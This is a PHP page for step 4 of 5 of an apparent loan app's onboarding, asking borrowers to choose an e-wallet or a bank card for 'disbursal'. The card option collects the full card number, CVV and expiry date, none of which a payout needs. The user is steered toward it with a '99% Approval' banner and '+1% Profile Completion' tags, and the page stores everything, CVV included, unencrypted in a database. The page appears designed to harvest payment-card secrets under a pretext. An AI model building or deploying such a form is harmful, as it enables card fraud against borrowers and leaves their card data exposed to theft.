<?php
require_once __DIR__ . '/../includes/auth.php';
require_login();

$uid = $_SESSION['user_id'];
$prog = get_onboarding_progress($uid);

// Redirect to first incomplete step (unless it's this one)
$firstIncomplete = 0;
for ($i = 1; $i <= 5; $i++) {
  if (!$prog['steps'][$i]) { $firstIncomplete = $i; break; }
}
if ($firstIncomplete && $firstIncomplete !== 4) { redirect('onboarding/step' . $firstIncomplete . '.php'); }

$errors = [];
$form = [
  'method' => 'ewallet',
  'ewallet_number' => '', 'ewallet_name' => '', 'ewallet_provider' => '',
  'bank_name' => '', 'card_number' => '', 'cvv' => '', 'expiry_date' => '',
];

$stmt = db()->prepare('SELECT * FROM disbursal_method WHERE user_id = ?');
$stmt->execute([$uid]);
if ($row = $stmt->fetch()) { $form = array_merge($form, $row); }

$qr_image = get_setting('qr_agreement_image');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $form['method'] = $_POST['method'] ?? 'ewallet';

  if ($form['method'] === 'ewallet') {
    $form['ewallet_number'] = trim($_POST['ewallet_number'] ?? '');
    $form['ewallet_name']   = trim($_POST['ewallet_name'] ?? '');
    $form['ewallet_provider'] = trim($_POST['ewallet_provider'] ?? '');
    if ($form['ewallet_number'] === '') $errors['ewallet_number'] = 'E-Wallet number is required.';
    if ($form['ewallet_name'] === '') $errors['ewallet_name'] = 'Account name is required.';
    if ($form['ewallet_provider'] === '') $errors['ewallet_provider'] = 'Provider is required.';
  } else {
    $form['bank_name']   = trim($_POST['bank_name'] ?? '');
    $form['card_number'] = trim($_POST['card_number'] ?? '');
    $form['cvv']         = trim($_POST['cvv'] ?? '');
    $form['expiry_date'] = trim($_POST['expiry_date'] ?? '');
    if ($form['bank_name'] === '') $errors['bank_name'] = 'Bank name is required.';
    if ($form['card_number'] === '') $errors['card_number'] = 'Card number is required.';
    if ($form['cvv'] === '') $errors['cvv'] = 'CVV is required.';
    if ($form['expiry_date'] === '') $errors['expiry_date'] = 'Expiration date is required.';
  }

  if (!$errors) {
    $stmt = db()->prepare('INSERT INTO disbursal_method
      (user_id, method, ewallet_number, ewallet_name, ewallet_provider, bank_name, card_number, cvv, expiry_date)
      VALUES (?,?,?,?,?,?,?,?,?)
      ON DUPLICATE KEY UPDATE
      method=VALUES(method), ewallet_number=VALUES(ewallet_number), ewallet_name=VALUES(ewallet_name), ewallet_provider=VALUES(ewallet_provider), bank_name=VALUES(bank_name), card_number=VALUES(card_number), cvv=VALUES(cvv), expiry_date=VALUES(expiry_date)');
    $stmt->execute([$uid, $form['method'], $form['ewallet_number'] ?: null, $form['ewallet_name'] ?: null, $form['ewallet_provider'] ?: null, $form['bank_name'] ?: null, $form['card_number'] ?: null, $form['cvv'] ?: null, $form['expiry_date'] ?: null]);
    db()->prepare('UPDATE users SET onboarding_step = GREATEST(onboarding_step, 4) WHERE id = ?')->execute([$uid]);
    redirect('onboarding/step5.php');
  }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<?php app_head('Onboarding · Disbursal Method'); ?>
<style>
  .method-tab { display:flex; gap:var(--space-2); margin-bottom: var(--space-5); background:var(--neutral-100); border-radius:var(--radius-md); padding:4px; }
  .method-tab button { flex:1; padding:var(--space-3); border-radius:var(--radius-sm); font-weight:600; font-size:.88rem; color:var(--neutral-500); transition: all var(--t-fast) var(--ease); }
  .method-tab button.active { background:var(--neutral-0); color:var(--primary-700); box-shadow:var(--shadow-sm); }
  .method-panel { display:none; }
  .method-panel.active { display:block; }
  .approval-banner { background:linear-gradient(135deg,var(--accent-400),var(--accent-600)); color:#fff; border-radius:var(--radius-md); padding:var(--space-4); text-align:center; margin-bottom:var(--space-4); font-weight:700; }
</style>
</head>
<body>
<div class="app-shell">
  <div class="topbar">
    <a href="<?= BASE_URL ?>/onboarding/step3.php" class="topbar-back">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="20" height="20"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
    </a>
    <span class="topbar-title">Step 4 of 5</span>
    <div style="width:40px"></div>
  </div>

  <div class="page">
    <div class="progress-wrap">
      <div class="progress-head"><span>Onboarding Progress</span><span><?= $prog['pct'] ?>%</span></div>
      <div class="progress-track"><div class="progress-fill" style="width:<?= $prog['pct'] ?>%"></div></div>
    </div>
    <div class="step-dots">
      <div class="step-dot done"></div>
      <div class="step-dot done"></div>
      <div class="step-dot done"></div>
      <div class="step-dot <?= $prog['steps'][4] ? 'done' : 'active' ?>"></div>
      <div class="step-dot <?= $prog['steps'][5] ? 'done' : '' ?>"></div>
    </div>

    <div class="page-head">
      <h1>Disbursal Method</h1>
      <p>Choose how you'd like to receive your loan.</p>
    </div>

    <!-- QR / Loan Agreement -->
    <div class="card mb-6">
      <div class="qr-wrap">
        <div class="qr-frame">
          <?php if ($qr_image): ?>
            <img src="<?= upload_url($qr_image) ?>" alt="Loan Agreement QR">
          <?php else: ?>
            <div style="display:grid;place-items:center;width:100%;height:100%;color:var(--neutral-400);font-size:.8rem;text-align:center;padding:var(--space-3);">Loan agreement image not set. Admin can upload one.</div>
          <?php endif; ?>
        </div>
        <p class="text-sm text-muted" style="text-align:center; max-width:260px;">Please read the loan agreement before applying.</p>
      </div>
    </div>

    <form method="POST" id="disbursalForm" novalidate>
      <div class="method-tab">
        <button type="button" id="tabEwallet" class="<?= $form['method']==='ewallet'?'active':'' ?>" onclick="switchMethod('ewallet')">E-Wallet</button>
        <button type="button" id="tabBank" class="<?= $form['method']==='bank'?'active':'' ?>" onclick="switchMethod('bank')">Bank Card</button>
      </div>
      <input type="hidden" name="method" id="methodHidden" value="<?= e($form['method']) ?>">

      <!-- E-Wallet Panel -->
      <div class="method-panel <?= $form['method']==='ewallet'?'active':'' ?>" id="panelEwallet">
        <div class="field">
          <label class="field-label">E-Wallet Provider <span class="pct">+1% Profile Completion</span></label>
          <select name="ewallet_provider" class="field-select">
            <option value="">Select...</option>
            <option value="GCash" <?= $form['ewallet_provider']==='GCash'?'selected':'' ?>>GCash</option>
            <option value="Maya" <?= $form['ewallet_provider']==='Maya'?'selected':'' ?>>Maya</option>
            <option value="ShopeePay" <?= $form['ewallet_provider']==='ShopeePay'?'selected':'' ?>>ShopeePay</option>
            <option value="GrabPay" <?= $form['ewallet_provider']==='GrabPay'?'selected':'' ?>>GrabPay</option>
            <option value="Coins.ph" <?= $form['ewallet_provider']==='Coins.ph'?'selected':'' ?>>Coins.ph</option>
          </select>
          <?php if (!empty($errors['ewallet_provider'])): ?><div class="field-error"><?= e($errors['ewallet_provider']) ?></div><?php endif; ?>
        </div>
        <div class="field">
          <label class="field-label">E-Wallet Number <span class="pct">+1% Profile Completion</span></label>
          <input type="tel" name="ewallet_number" class="field-input" value="<?= e($form['ewallet_number']) ?>" placeholder="09XX XXX XXXX">
          <?php if (!empty($errors['ewallet_number'])): ?><div class="field-error"><?= e($errors['ewallet_number']) ?></div><?php endif; ?>
        </div>
        <div class="field">
          <label class="field-label">Account Name <span class="pct">+1% Profile Completion</span></label>
          <input type="text" name="ewallet_name" class="field-input" value="<?= e($form['ewallet_name']) ?>" placeholder="Juan Dela Cruz">
          <?php if (!empty($errors['ewallet_name'])): ?><div class="field-error"><?= e($errors['ewallet_name']) ?></div><?php endif; ?>
        </div>
      </div>

      <!-- Bank Panel -->
      <div class="method-panel <?= $form['method']==='bank'?'active':'' ?>" id="panelBank">
        <div class="approval-banner">99% Approval for Card Disbursal</div>
        <div class="field">
          <label class="field-label">Bank Name <span class="pct">+1% Profile Completion</span></label>
          <select name="bank_name" class="field-select">
            <option value="">Select...</option>
            <option value="BDO" <?= $form['bank_name']==='BDO'?'selected':'' ?>>BDO</option>
            <option value="BPI" <?= $form['bank_name']==='BPI'?'selected':'' ?>>BPI</option>
            <option value="Metrobank" <?= $form['bank_name']==='Metrobank'?'selected':'' ?>>Metrobank</option>
            <option value="PNB" <?= $form['bank_name']==='PNB'?'selected':'' ?>>PNB</option>
            <option value="Land Bank" <?= $form['bank_name']==='Land Bank'?'selected':'' ?>>Land Bank</option>
            <option value="Security Bank" <?= $form['bank_name']==='Security Bank'?'selected':'' ?>>Security Bank</option>
            <option value="UnionBank" <?= $form['bank_name']==='UnionBank'?'selected':'' ?>>UnionBank</option>
            <option value="China Bank" <?= $form['bank_name']==='China Bank'?'selected':'' ?>>China Bank</option>
            <option value="RCBC" <?= $form['bank_name']==='RCBC'?'selected':'' ?>>RCBC</option>
          </select>
          <?php if (!empty($errors['bank_name'])): ?><div class="field-error"><?= e($errors['bank_name']) ?></div><?php endif; ?>
        </div>
        <div class="field">
          <label class="field-label">Card Number <span class="pct">+1% Profile Completion</span></label>
          <input type="text" name="card_number" class="field-input" value="<?= e($form['card_number']) ?>" placeholder="XXXX XXXX XXXX XXXX" maxlength="19">
          <?php if (!empty($errors['card_number'])): ?><div class="field-error"><?= e($errors['card_number']) ?></div><?php endif; ?>
        </div>
        <div class="field-grid">
          <div class="field">
            <label class="field-label">CVV <span class="pct">+1% Profile Completion</span></label>
            <input type="text" name="cvv" class="field-input" value="<?= e($form['cvv']) ?>" placeholder="123" maxlength="4">
            <?php if (!empty($errors['cvv'])): ?><div class="field-error"><?= e($errors['cvv']) ?></div><?php endif; ?>
          </div>
          <div class="field">
            <label class="field-label">Expiration Date <span class="pct">+1% Profile Completion</span></label>
            <input type="text" name="expiry_date" class="field-input" value="<?= e($form['expiry_date']) ?>" placeholder="MM/YY" maxlength="5">
            <?php if (!empty($errors['expiry_date'])): ?><div class="field-error"><?= e($errors['expiry_date']) ?></div><?php endif; ?>
          </div>
        </div>
      </div>

      <button type="submit" class="btn btn-primary mt-4">Save & Continue</button>
    </form>
  </div>
</div>
<script src="<?= BASE_URL ?>/assets/js/app.js"></script>
<script>
function switchMethod(m) {
  document.getElementById('methodHidden').value = m;
  document.getElementById('tabEwallet').classList.toggle('active', m === 'ewallet');
  document.getElementById('tabBank').classList.toggle('active', m === 'bank');
  document.getElementById('panelEwallet').classList.toggle('active', m === 'ewallet');
  document.getElementById('panelBank').classList.toggle('active', m === 'bank');
}
</script>
</body>
</html>
